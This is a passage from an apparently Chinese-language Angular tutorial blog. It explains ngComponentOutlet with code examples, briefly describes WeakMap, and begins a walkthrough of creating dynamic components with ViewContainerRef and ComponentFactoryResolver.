</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>其中，ngComponentOutletInjector、ngComponentOutletContent、ngComponentOutletNgModuleFactory 为可选输入。使用 Macro Syntax DSL 时的用法为：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ng-container</span> <span class="token attr-name">*ngComponentOutlet</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>componentTypeExpression; injector: injectorExpression; content: contentNodesExpression; ngModuleFactory: moduleFactory;<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ng-container</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>简单版本：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ng-container</span> <span class="token attr-name">*ngComponentOutlet</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>componentTypeExpression<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ng-container</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>实例1：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> AlertComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./alert.component'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    ...
    &lt;ng-container *ngComponentOutlet=&quot;alertComponent&quot;&gt;&lt;/ng-container&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnDestroy</span> <span class="token punctuation">{</span>
  alertComponent <span class="token operator">=</span> AlertComponent<span class="token punctuation">;</span>
  <span class="token comment">//...</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>实例2:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">Greeter</span> <span class="token punctuation">{</span>
  suffix <span class="token operator">=</span> <span class="token string">'!'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'complete-component'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Complete: &lt;ng-content&gt;&lt;/ng-content&gt; &lt;ng-content&gt;&lt;/ng-content&gt;{{ greeter.suffix }}</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CompleteComponent</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> greeter<span class="token operator">:</span> Greeter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'ng-component-outlet-complete-example'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;ng-container *ngComponentOutlet=&quot;CompleteComponent;
                                      injector: myInjector;
                                      content: myContent&quot;&gt;&lt;/ng-container&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgComponentOutletCompleteExample</span> <span class="token punctuation">{</span>
  <span class="token comment">// This field is necessary to expose CompleteComponent to the template.</span>
  CompleteComponent <span class="token operator">=</span> CompleteComponent<span class="token punctuation">;</span>
  myInjector<span class="token operator">:</span> Injector<span class="token punctuation">;</span>
  myContent <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">'Ahoj'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">'Svet'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">injector<span class="token operator">:</span> Injector</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>myInjector <span class="token operator">=</span>
        Injector<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">{</span>providers<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>provide<span class="token operator">:</span> Greeter<span class="token punctuation">,</span> deps<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> parent<span class="token operator">:</span> injector<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p>实例3：实现组件位置交换</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// button.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
 selector<span class="token operator">:</span> <span class="token string">'app-button'</span><span class="token punctuation">,</span>
 template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;button&gt;按钮&lt;/button&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
 styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./button.component.css'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ButtonComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
 <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
 <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token punctuation">}</span>
<span class="token comment">// text.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit<span class="token punctuation">,</span> Input <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
 selector<span class="token operator">:</span> <span class="token string">'app-text'</span><span class="token punctuation">,</span>
 template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
 &lt;label for=&quot;&quot;&gt;{{textName}}&lt;/label&gt;
 &lt;input type=&quot;text&quot;&gt;
 </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
 styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./text.component.css'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">TextComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
 @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> textName <span class="token operator">=</span> <span class="token string">'null'</span><span class="token punctuation">;</span>
 <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
 <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token punctuation">}</span> 
<span class="token punctuation">}</span>
<span class="token comment">// 实现组件位置交换</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> TextComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./text/text.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ButtonComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./button/button.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
 selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
 template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
 &lt;ng-container *ngFor=&quot;let item of componentArr&quot; &gt;
  &lt;ng-container *ngComponentOutlet=&quot;item&quot;&gt;&lt;/ng-container&gt;
 &lt;/ng-container&gt;
 &lt;br&gt;
 &lt;button (click)=&quot;swap()&quot;&gt;swap&lt;/button&gt;
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
 styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./app.component.css'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
 <span class="token keyword">public</span> componentArr <span class="token operator">=</span> <span class="token punctuation">[</span>TextComponent<span class="token punctuation">,</span> ButtonComponent<span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">public</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> temp <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>componentArr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>componentArr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>componentArr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>componentArr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br></div></div><p><img src="/vuebloger/img/post/2018112110905640.gif" alt=""></p> <h2 id="angular-cdk"><a href="#angular-cdk" class="header-anchor">#</a> Angular-Cdk</h2> <p>详解我的另外一篇<a href="/vuebloger/technology/angular-cdk详解.html">angular-cdk详解</a>。</p> <h2 id="weakmap"><a href="#weakmap" class="header-anchor">#</a> WeakMap</h2> <p>WeakMap 对象是一组键/值对的集合，其中的键是弱引用的。其键名必须是对象，而值可以是任意的。 键名是对象的弱引用，当对象被回收后，WeakMap自动移除对应的键值对，WeakMap结构有助于防止内存泄漏。 可以与Map对比理解，Map中key可以是各种类型，而WeakMap必须是对象。 这样WeakMap就可以用来在不修改原引用类型对象的基础上，而扩充该对象的属性值，并且不影响引用类型对象的垃圾回收，随该对象的消失，扩充属性随之消失。</p> <h2 id="动态组件"><a href="#动态组件" class="header-anchor">#</a> 动态组件</h2> <p>angular共有4种创建动态内容，以下一一说明。</p> <h3 id="使用viewcontainerref"><a href="#使用viewcontainerref" class="header-anchor">#</a> 使用ViewContainerRef</h3> <h4 id="实例1："><a href="#实例1：" class="header-anchor">#</a> 实例1：</h4> <ol><li>定义 AlertComponent 组件</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>exe<span class="token operator">-</span>alert<span class="token punctuation">.</span>component<span class="token punctuation">.</span>ts
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> Output<span class="token punctuation">,</span> EventEmitter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">&quot;exe-alert&quot;</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;h1 (click)=&quot;output.next(type)&quot;&gt;Alert {{type}}&lt;/h1&gt;
    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AlertComponent</span> <span class="token punctuation">{</span>
    @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> type<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">&quot;success&quot;</span><span class="token punctuation">;</span>
    @<span class="token function">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><ol start="2"><li>创建组件容器（在 Angular 中放置组件的地方称为 container 容器）</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>
  Component<span class="token punctuation">,</span> ViewChild<span class="token punctuation">,</span> ViewContainerRef<span class="token punctuation">,</span> ComponentFactory<span class="token punctuation">,</span>
  ComponentRef<span class="token punctuation">,</span> ComponentFactoryResolver<span class="token punctuation">,</span> OnDestroy
<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> AlertComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./exe-alert.component'</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;ng-template #alertContainer&gt;&lt;/ng-template&gt;
    &lt;button (click)=&quot;createComponent('success')&quot;&gt;Create success alert&lt;/button&gt;
    &lt;button (click)=&quot;createComponent('danger')&quot;&gt;Create danger alert&lt;/button&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnDestroy</span> <span class="token punctuation">{</span>
  componentRef<span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span>AlertComponent<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  @<span class="token function">ViewChild</span><span class="token punctuation">(</span><span class="token string">&quot;alertContainer&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> read<span class="token operator">:</span> ViewContainerRef <span class="token punctuation">}</span><span class="token punctuation">)</span> container<span class="token operator">:</span> ViewContainerRef<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> resolver<span class="token operator">:</span> ComponentFactoryResolver</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">createComponent</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> factory<span class="token operator">:</span> ComponentFactory<span class="token operator">&lt;</span>AlertComponent<span class="token operator">&gt;</span> <span class="token operator">=</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>resolver<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>AlertComponent<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>componentRef <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">createComponent</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>
     <span class="token keyword">this</span><span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>output<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">msg<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngOnDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><ol start="3"><li>获取 ViewContainerRef 实例，动态创建组件</li></ol> <p>在我们定义 createComponent() 方法前，我们需要注入 ComponentFactoryResolver 服务对象。该 ComponentFactoryResolver 服务对象中，提供了一个很重要的方法 - resolveComponentFactory() ，该方法接收一个组件类作为参数，并返回 ComponentFactory 。
ComponentFactoryResolver 抽象类：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> abstract <span class="token keyword">class</span> <span class="token class-name">ComponentFactoryResolver</span> <span class="token punctuation">{</span>
  <span class="token keyword">static</span> <span class="token constant">NULL</span><span class="token operator">:</span> ComponentFactoryResolver <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">_NullComponentFactoryResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  abstract resolveComponentFactory<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>component<span class="token operator">:</span> Type<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> ComponentFactory<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>在 AppComponent 组件构造函数中，注入 ComponentFactoryResolver 服务：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> resolver<span class="token operator">:</span> ComponentFactoryResolver</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>接下来我们再来看一下 ComponentFactory 抽象类：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> abstract <span class="token keyword">class</span> <span class="token class-name">ComponentFactory</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
  abstract <span class="token keyword">get</span> <span class="token function">selector</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
  abstract <span class="token keyword">get</span> <span class="token function">componentType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  
  <span class="token comment">// selector for all &lt;ng-content&gt; elements in the component.</span>
  abstract <span class="token keyword">get</span> <span class="token function">ngContentSelectors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">// the inputs of the component.</span>
  abstract <span class="token keyword">get</span> <span class="token function">inputs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">{</span>propName<span class="token operator">:</span> string<span class="token punctuation">,</span> templateName<span class="token operator">:</span> string<span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">// the outputs of the component.</span>
  abstract <span class="token keyword">get</span> <span class="token function">outputs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">{</span>propName<span class="token operator">:</span> string<span class="token punctuation">,</span> templateName<span class="token operator">:</span> string<span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">// Creates a new component.</span>
  abstract <span class="token function">create</span><span class="token punctuation">(</span>
      injector<span class="token operator">:</span> Injector<span class="token punctuation">,</span> projectableNodes<span class="token operator">?</span><span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rootSelectorOrNode<span class="token operator">?</span><span class="token operator">:</span> string<span class="token operator">|</span>any<span class="token punctuation">,</span>
      ngModule<span class="token operator">?</span><span class="token operator">:</span> NgModuleRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>通过观察 ComponentFactory 抽象类，我们知道可以通过调用 ComponentFactory 实例的 create() 方法，来创建组件。介绍完上面的知识，我们来实现 AppComponent 组件的 createComponent() 方法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">createComponent</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token keyword">const</span> factory<span class="token operator">:</span> ComponentFactory <span class="token operator">=</span> 
     <span class="token keyword">this</span><span class="token punctuation">.</span>resolver<span class="token punctuation">.</span><span class="token function">resolveComponentFactory</span><span class="token punctuation">(</span>AlertComponent<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>componentRef<span class="token operator">:</span> ComponentRef <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>container<span class="token punctuation">.</span><span class="token function">createComponent</span><span class="token punctuation">(</span>factory<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li>每次我们需要创建组件时，我们需要删除之前的视图，否则组件容器中会出现多个视图 (如果允许多个组件的话，就不需要执行清除操作 )。</li> <li>resolveComponentFactory() 方法接受一个组件并返回如何创建组件的 ComponentFactory 实例。</li> <li>我们调用容器的 createComponent() 方法，该方法内部将调用 ComponentFactory 实例的 create() 方法创建对应的组件，并将组件添加到我们的容器。</li></ul> <p>现在我们已经能获取新组件的引用，即可以我们可以设置组件的输入类型：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>
